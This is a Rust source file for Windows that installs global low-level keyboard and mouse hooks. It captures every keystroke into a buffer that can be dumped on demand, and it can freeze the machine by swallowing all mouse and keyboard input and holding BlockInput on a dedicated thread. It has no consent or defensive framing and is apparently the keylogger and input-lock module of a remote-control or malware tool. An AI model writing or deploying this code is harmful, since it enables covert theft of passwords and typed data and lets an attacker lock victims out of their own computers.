// language: Rust, file: src/input.rs, target: Windows
// Global low-level input hooks: keylog capture + hard input freeze (mouse + keyboard swallow).
// BlockInput(true) is held on a dedicated long-lived thread so the block survives.
#![cfg(windows)]
#![allow(dead_code)]
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{mpsc, LazyLock, Mutex, OnceLock};

use windows_sys::Win32::Foundation::{LPARAM, LRESULT, WPARAM};
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
use windows_sys::Win32::UI::Input::KeyboardAndMouse::BlockInput;
use windows_sys::Win32::UI::WindowsAndMessaging::{
    CallNextHookEx, DispatchMessageW, GetMessageW, SetWindowsHookExW, TranslateMessage,
    KBDLLHOOKSTRUCT, MSLLHOOKSTRUCT, MSG, WH_KEYBOARD_LL, WH_MOUSE_LL, WM_KEYDOWN,
    WM_SYSKEYDOWN,
};

pub static FREEZE: AtomicBool = AtomicBool::new(false);
static LOGGING: AtomicBool = AtomicBool::new(false);
static KEYLOG: LazyLock<Mutex<String>> = LazyLock::new(|| Mutex::new(String::new()));
static FREEZE_TX: OnceLock<mpsc::Sender<bool>> = OnceLock::new();

/// Install the keyboard + mouse hooks once. The owning thread pumps messages for the
/// process lifetime.
pub fn start_hooks() {
    std::thread::spawn(|| unsafe {
        let hmod = GetModuleHandleW(std::ptr::null());
        let _kb = SetWindowsHookExW(WH_KEYBOARD_LL as i32, Some(kb_proc), hmod, 0);
        let _ms = SetWindowsHookExW(WH_MOUSE_LL as i32, Some(mouse_proc), hmod, 0);
        let mut msg: MSG = std::mem::zeroed();
        while GetMessageW(&mut msg, std::ptr::null_mut(), 0, 0) > 0 {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    });
}

/// Long-lived thread that holds BlockInput(true) until told to release.
pub fn init_freeze_thread() {
    let (tx, rx) = mpsc::channel::<bool>();
    let _ = FREEZE_TX.set(tx);
    std::thread::spawn(move || {
        while let Ok(state) = rx.recv() {
            unsafe {
                let _ = BlockInput(if state { 1 } else { 0 });
            }
        }
    });
}

pub fn freeze() {
    FREEZE.store(true, Ordering::SeqCst);
    if let Some(tx) = FREEZE_TX.get() {
        let _ = tx.send(true);
    }
}

pub fn unfreeze() {
    FREEZE.store(false, Ordering::SeqCst);
    if let Some(tx) = FREEZE_TX.get() {
        let _ = tx.send(false);
    }
}

pub fn keylog_start() {
    LOGGING.store(true, Ordering::SeqCst);
}
pub fn keylog_stop() {
    LOGGING.store(false, Ordering::SeqCst);
}
pub fn keylog_clear() {
    if let Ok(mut g) = KEYLOG.lock() {
        g.clear();
    }
}
pub fn keylog_dump() -> String {
    KEYLOG.lock().map(|g| g.clone()).unwrap_or_default()
}

unsafe extern "system" fn kb_proc(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    if code >= 0 {
        let w = wparam as u32;
        if w == WM_KEYDOWN || w == WM_SYSKEYDOWN {
            let kb = &*(lparam as *const KBDLLHOOKSTRUCT);
            if LOGGING.load(Ordering::SeqCst) {
                let name = vk_name(kb.vkCode);
                if let Ok(mut g) = KEYLOG.lock() {
                    match name.as_str() {
                        "[ENTER]" => g.push('\n'),
                        _ => g.push_str(&name),
                    }
                    if g.len() > 1_000_000 {
                        let len = g.len();
                        let keep = g.split_off(len - 500_000);
                        *g = keep;
                    }
                }
            }
            if FREEZE.load(Ordering::SeqCst) {
                return 1;
            }
        }
    }
    CallNextHookEx(std::ptr::null_mut(), code, wparam, lparam)
}

unsafe extern "system" fn mouse_proc(code: i32, _wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    if code >= 0 && FREEZE.load(Ordering::SeqCst) {
        // Swallow every mouse message: moves, clicks, wheel.
        let _ = lparam as *const MSLLHOOKSTRUCT;
        return 1;
    }
    CallNextHookEx(std::ptr::null_mut(), code, _wparam, lparam)
}

fn vk_name(vk: u32) -> String {
    match vk {
        0x08 => "[BKSP]".into(),
        0x09 => "[TAB]".into(),
        0x0D => "[ENTER]".into(),
        0x1B => "[ESC]".into(),
        0x20 => " ".into(),
        0x10 | 0xA0 | 0xA1 => "[SHIFT]".into(),
        0x11 | 0xA2 | 0xA3 => "[CTRL]".into(),
        0x12 | 0xA4 | 0xA5 => "[ALT]".into(),
        0x5B | 0x5C => "[WIN]".into(),
        0x14 => "[CAPS]".into(),
        0x2E => "[DEL]".into(),
        0x25 => "[LEFT]".into(),
        0x26 => "[UP]".into(),
        0x27 => "[RIGHT]".into(),
        0x28 => "[DOWN]".into(),
        0x30..=0x39 => ((vk as u8) as char).to_string(),
        0x41..=0x5A => ((vk as u8) as char).to_string(),
        0x60..=0x69 => format!("[NUM{}]", vk - 0x60),
        0x70..=0x87 => format!("[F{}]", vk - 0x6F),
        0xBA => ";".into(),
        0xBB => "=".into(),
        0xBC => ",".into(),
        0xBD => "-".into(),
        0xBE => ".".into(),
        0xBF => "/".into(),
        0xDB => "[".into(),
        0xDC => "\\".into(),
        0xDD => "]".into(),
        0xDE => "'".into(),
        0xC0 => "`".into(),
        _ => format!("[0x{vk:X}]"),
    }
}
